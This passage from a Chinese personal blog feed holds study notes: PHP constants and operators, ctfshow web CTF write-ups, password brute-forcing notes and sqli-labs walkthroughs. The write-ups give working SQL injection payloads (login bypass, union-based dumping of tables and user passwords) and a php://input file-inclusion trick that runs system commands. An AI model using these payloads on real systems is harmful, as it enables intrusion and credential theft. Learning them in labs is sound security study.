src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056818.png"></p><h1 id="PHP第六节-常量与变量"><a href="#PHP第六节-常量与变量" class="headerlink" title="PHP第六节_常量与变量_"></a>PHP第六节_常量与变量_</h1><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032056822.png"></p><h3 id="1）定义和使用"><a href="#1）定义和使用" class="headerlink" title="1）定义和使用"></a>1）定义和使用</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057433.png"></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057506.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'MY_NAME'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'看云'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">MY_NAME</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057709.png"></p><h3 id="2）常量的命名"><a href="#2）常量的命名" class="headerlink" title="2）常量的命名"></a>2）常量的命名</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057646.png" alt="image-20220318200802563"></p><h3 id="3）常量和变量的区别"><a href="#3）常量和变量的区别" class="headerlink" title="3）常量和变量的区别"></a>3）常量和变量的区别</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057836.png"></p><h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057542.png"></p><h4 id="查看预定义常量语句"><a href="#查看预定义常量语句" class="headerlink" title="查看预定义常量语句"></a>查看预定义常量语句</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">get_defind_contants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//预定义常量是不区分大小写的，自己定义的是严格区分大小写的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="举例查看"><a href="#举例查看" class="headerlink" title="举例查看"></a>举例查看</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">__LINE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_OS</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_VERSION</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> __file__<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> __line__<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token comment">//print_r(get_defined_constants());</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057135.png"></p><h3 id="八个魔术常量"><a href="#八个魔术常量" class="headerlink" title="八个魔术常量"></a>八个魔术常量</h3><p><a href="https://www.php.net/manual/zh/language.constants.magic.php">魔术常量</a></p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h4><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057895.png" style="zoom:50%;" /><h4 id="1）算术运算符"><a href="#1）算术运算符" class="headerlink" title="1）算术运算符"></a>1）算术运算符</h4><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057762.png" style="zoom:50%;" /><center>  tip：变量被取反并不会影响到变量本身  </center>**注意**：![](https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057091.png)<h4 id="2-字符串运算符"><a href="#2-字符串运算符" class="headerlink" title="2)字符串运算符"></a>2)字符串运算符</h4><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057965.png"></p><p>举例：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057783.png"></p><h4 id="3-赋值运算符"><a href="#3-赋值运算符" class="headerlink" title="3)赋值运算符"></a>3)赋值运算符</h4><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057394.png" style="zoom:50%;" /><h5 id=""><a href="#" class="headerlink" title=".="></a>.=</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//.= 在php中是字符串连接的意思</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'bc'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057945.png"></p><h4 id="4）比较运算符"><a href="#4）比较运算符" class="headerlink" title="4）比较运算符"></a>4）比较运算符</h4><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057826.png" style="zoom:50%;" /><p>举例：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032057391.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1112</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1112'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token comment">//!=（不等）与!==（不全等）的区别</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!=</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058924.png"></p><h4 id="5）逻辑运算符"><a href="#5）逻辑运算符" class="headerlink" title="5）逻辑运算符"></a>5）逻辑运算符</h4><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058784.png"></p><h5 id="概念与要求："><a href="#概念与要求：" class="headerlink" title="概念与要求："></a>概念与要求：</h5><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058697.png"></p><center>   <u>        && ||的优先级别比 and or 高    </u></center><h5 id="逻辑非的运算规则"><a href="#逻辑非的运算规则" class="headerlink" title="逻辑非的运算规则"></a>逻辑非的运算规则</h5><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058502.png"></p><h4 id="6-其他运算符"><a href="#6-其他运算符" class="headerlink" title="6)其他运算符"></a>6)其他运算符</h4><ol><li> 三元运算符  ？： </li></ol><p>   运算规则：<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058718.png"></p><ol start="2"><li> ``</li></ol><p>   <img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058156.png"></p><ol start="3"><li> @</li></ol><p>   <img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058127.png"></p><ol start="4"><li><p> =&gt;  （学到数组时学习）</p></li><li><p>-&gt;</p></li><li><p>instanceof</p></li></ol><h4 id="7-运算符的优先级"><a href="#7-运算符的优先级" class="headerlink" title="7)运算符的优先级"></a>7)运算符的优先级</h4><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058392.png"></p><p>短路问题：</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032058838.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$a</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">++</span><span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//短路：上面的++$b被短路 </span> <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//b=1;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfShow_web_学习记录</title>
      <link href="/2022/03/13/ctfShow-web-1~3/"/>
      <url>/2022/03/13/ctfShow-web-1~3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-web-签到题"><a href="#1-web-签到题" class="headerlink" title="1.web 签到题"></a>1.web 签到题</h1><p>题目场景：<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051688.png"></p><p>思路：页面描述很简单，选择查看源代码</p><h3 id="看到类似flag，提交–-gt-失败"><a href="#看到类似flag，提交–-gt-失败" class="headerlink" title="看到类似flag，提交–&gt;失败"></a>看到类似flag，提交–&gt;失败</h3><p>flag应该是它，但是有点复杂无规律—&gt;突然想到：符合base64条件</p><p>尝试：成功得到flag</p><h1 id="2-ctf-show-web2"><a href="#2-ctf-show-web2" class="headerlink" title="2.ctf.show_web2"></a>2.ctf.show_web2</h1><p><a href="https://blog.csdn.net/qq_34638225/article/details/81269281?ops_request_misc=&request_id=&biz_id=102&utm_term=sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-81269281.142%5Ev2%5Epc_search_result_control_group,143%5Ev4%5Econtrol&spm=1018.2226.3001.4187">SQL理解学习</a></p><h2 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h2><p>SQL万能密码<u>‘ or 1 = 1 #</u>与<u>(a’ or true #)</u>介绍：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> uername<span class="token operator">=</span><span class="token string">' '</span> or1<span class="token operator">=</span><span class="token number">1</span><span class="token comment">#' and password=balabala</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>“#”为注释符，则语句相当于：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>即绕过密码登录</strong></p><h2 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h2><p>GET为url传参，POST为页面内部传参</p><p>判断字段：</p><pre class="line-numbers language-none"><code class="language-none">&#39; or 1&#x3D;1 union select 1,2,3 #只有中间位2，改变时页面回显内容会跟着一起改变，必须是三个数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032051380.png"></p><p>说明有三个字段</p><p>现在要做顺序就是爆库，爆表，爆字段，爆值</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052076.png"></p><h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"web2"</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052037.png"></p><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"flag"</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052615.png"></p><p><u>以下这一句是查错多余的<u/></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> column_name<span class="token operator">=</span><span class="token string">"flag"</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052508.png"></p><h3 id="爆字段值"><a href="#爆字段值" class="headerlink" title="爆字段值"></a>爆字段值</h3><center>    直接简单查看</center><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> flag<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052069.png"></p><center>    此处贴几个常用基本语句</center><table><thead><tr><th>爆库</th><th>union select 1,2,3,database(); #   //这里得看有多少字段</th></tr></thead><tbody><tr><td>爆表</td><td>union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #</td></tr><tr><td>爆字段</td><td>union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=”表名”; #</td></tr><tr><td>爆值</td><td>union select 1,2,3,字段 from 表名; #</td></tr></tbody></table><h1 id="3-ctf-show-web3"><a href="#3-ctf-show-web3" class="headerlink" title="3.ctf.show_web3"></a>3.ctf.show_web3</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><center>    <u>看到关键字include（），想到可能与PHP文件包含有关</u></center><p><strong>并且这个文件包含是利用了GET方式在url中进行传参</strong></p><p>查看PHP的include(),了解到了PHP伪协议的用法</p><h3 id="点这里了解：文件包含漏洞与PHP伪协议结合"><a href="#点这里了解：文件包含漏洞与PHP伪协议结合" class="headerlink" title="点这里了解：文件包含漏洞与PHP伪协议结合"></a><em>点这里了解：</em><u><a href="https://blog.csdn.net/zpy1998zpy/article/details/80598768?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164770178116780271973319%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164770178116780271973319&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-80598768.142%5Ev2%5Epc_search_result_control_group,143%5Ev4%5Econtrol&utm_term=PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&spm=1018.2226.3001.4187">文件包含漏洞与PHP伪协议结合</a></u></h3><blockquote><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>这个协议的利用方法是 将要执行的语法php代码写在post中提交，不用键与值的形式，只写代码即可</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">条件：allow_url_include=Onallow_url_fopen-Off/On<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><h3 id="1-先使用-etc-passwd"><a href="#1-先使用-etc-passwd" class="headerlink" title="1.先使用//etc/passwd"></a>1.先使用//etc/passwd</h3><p>尝试查看其他页面</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052238.png"></p><h2 id="2-使用php-input"><a href="#2-使用php-input" class="headerlink" title="2.使用php://input"></a>2.使用php://input</h2><p>利用post查看当前目录结构</p><blockquote><p>BP抓包，body中写入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052502.png"></p><h2 id="3-查看ctf-go-go-go文件"><a href="#3-查看ctf-go-go-go文件" class="headerlink" title="3.查看ctf_go_go_go文件"></a>3.查看ctf_go_go_go文件</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032052427.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF_WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web_口令爆破_学习笔记</title>
      <link href="/2022/03/06/web-%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/06/web-%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一节：常见协议"><a href="#第一节：常见协议" class="headerlink" title="第一节：常见协议"></a>第一节：常见协议</h1><h2 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h2><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032108860.png" style="zoom:50%;" /><p><strong>理解：使用字典去猜用户的用户名与密码（通过工具去爆破）</strong></p><h2 id="2-常见端口"><a href="#2-常见端口" class="headerlink" title="2.常见端口"></a>2.常见端口</h2><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032108570.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032108409.png" style="zoom:50%;" /><h2 id="3-爆破工具hydra"><a href="#3-爆破工具hydra" class="headerlink" title="3.爆破工具hydra"></a>3.爆破工具hydra</h2><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032108260.png" style="zoom:50%;" /><h1 id="第二节：字典说明"><a href="#第二节：字典说明" class="headerlink" title="第二节：字典说明"></a>第二节：字典说明</h1><p>1.暴力破解简单说明：<br><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203172215285.png"><br>2.根据提供信息生成密码：<br><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032108030.png"><br>3.白鹿社工字典生成器（github)<br>4.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 口令爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs摸坑</title>
      <link href="/2022/02/25/sqli-labs%E6%91%B8%E5%9D%91/"/>
      <url>/2022/02/25/sqli-labs%E6%91%B8%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是被迫做Noob一天@@<br>==1==先摘抄一段学习大佬内容（仅以提醒自己知识点）<br><code>mysql注入必懂的知识点 1）在mysql5.0版本以上中，存在一个自带数据库名information_schema自带 记录所有数据库名 表名 列名 2）数据库中符号“.”代表下一级，如user.user表示数据库user下的user表 3）information_schema.tables：记录所有表名信息的表 4）information_schema.columns：记录所有列名信息的表 5）table_schema：数据库名 6）table_name：表名 7）column_name：字段名 8）group_concat(table_name)：查询所有的表 9) 猜解多个数据：limit x，1 （变动x） 10）注释符：-- (后面有空格)(也就是–+) ，/**/ , payload结尾单引号闭合</code><br><a href="https://blog.csdn.net/qq_53577336/article/details/118462999">原文链接：</a></p><h1 id="less-1-‘-字符注入"><a href="#less-1-‘-字符注入" class="headerlink" title="less-1 ‘ 字符注入"></a>less-1 ‘ 字符注入</h1><p><strong>1：</strong>根据提示，判断类型<br>id=1，正常<br><code>id=1&#39;</code>错误<br><code>id=1&#39;--+</code>页面回显正确<br>把1=1改成1=2，不报错也不显示任何信息，说明可以利用 ’ 字符注入<br><strong>可以判断了</strong>：单引号字符注入<br>（==无泪==开始数据库没链接上？我说难道我的firefox和别人的不一样？^@^）<br>这里黄色字体是因为在Less-1脚本里加了个<code>echo $sql;</code><br><img src="https://img-blog.csdnimg.cn/img_convert/bafc4969bbb0d13d01468c8fe2454a2b.png" alt="image.png"><br>好的，接下来可以进行下一步<br><strong>2：</strong>order by 表中列查询<br><img src="https://img-blog.csdnimg.cn/img_convert/e1ebd8247bb84c36690867e590400256.png" alt="image.png"><br>==4==就查询不到了，应该有三列<br><strong>3：</strong>查询一下数据库的显示位（如果显示位确定，只能通过这个显示位来显示查询数据？）<br>使用union select 1,2,3联合查询语句查看<br><img src="https://img-blog.csdnimg.cn/img_convert/55d91aec3e2f64570b8a2a5bf1f1a639.png" alt="image.png"><br>说明页面有==2==个显示位<br><strong>4：</strong> 利用sql查询语句爆破出数据库内的数据库西信息<br>?id=888’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+<br>==数据库名查询语句==<br><img src="https://img-blog.csdnimg.cn/img_convert/c570336dc34d26f37455728f87da597e.png" alt="image.png"><br><strong>5：</strong>查询security内的所有表名<br>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+<br><img src="https://img-blog.csdnimg.cn/img_convert/866a1f0810c8502a5f7ab11d8f93d6ba.png" alt="image.png"><br><strong>6：</strong>爆破出列名<br>?id=’union SELECT 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)%23<br><img src="https://img-blog.csdnimg.cn/img_convert/1dea6fe66312f77570f142bc450bf82c.png" alt="image.png"><br><strong>7：</strong> 爆破字段内容：<code>?id=&#39;union SELECT 1,2,(select group_concat(username,0x3a,password) from users)%23</code><br><img src="https://img-blog.csdnimg.cn/img_convert/4e737b4c0e09e5fc6a79ef33340250d5.png" alt="image.png"><br>0x3a就是一个:,用16进制表示了，为了区分一下账号和密码，增加可视化</p><h1 id="less-2-GET-Error-based-intiger-based（基于错误的GET整型注入）"><a href="#less-2-GET-Error-based-intiger-based（基于错误的GET整型注入）" class="headerlink" title="less-2  GET-Error based-intiger based（基于错误的GET整型注入）"></a>less-2  GET-Error based-intiger based（基于错误的GET整型注入）</h1><p>**1:**整型数字可以直接查询，共有三个字段<img src="https://img-blog.csdnimg.cn/img_convert/dcb1e73c93167a4bdc4e0f71aad79d76.png" alt="image.png"><br>==Less1的爆破语句此处也都可以使用了==<br><strong>例子：</strong>数据库名语句查询<br><code>?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><br><strong>注意：</strong>id要写成’0‘或负数</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f9af4f9027523805de8b5a1f1e4c5346.png" alt="image.png"></p><h1 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3  GET-Error based-Single quotes with twist-string （基于错误的GET单引号变形字符型注入）"></a>Less-3  GET-Error based-Single quotes with twist-string （基于错误的GET单引号变形字符型注入）</h1><p>输入id=1测试，页面回显正常<br>输入id=1’测试，根据报错信息分析id格式<br><img src="https://img-blog.csdnimg.cn/img_convert/92cd4abcb20db9180b3605ce2f677307.png" alt="image.png"><br>可以得知id格式为id=（‘1’），要有闭合括号和单引号</p><p><strong>数据库查名：</strong><br><code>?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/f518ce623835e6f8842b29a7a5e4541e.png" alt="image.png"><br>由此，由联合语句可以进行爆破了<br><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users order by id -- a</code><br><img src="https://img-blog.csdnimg.cn/img_convert/b7ecf3afba9b7649ae4a84abe564191b.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xctf--Web--Challenge--area Wp</title>
      <link href="/2022/02/18/Xctf--Web--Challenge--area%20Wp/"/>
      <url>/2022/02/18/Xctf--Web--Challenge--area%20Wp/</url>
      
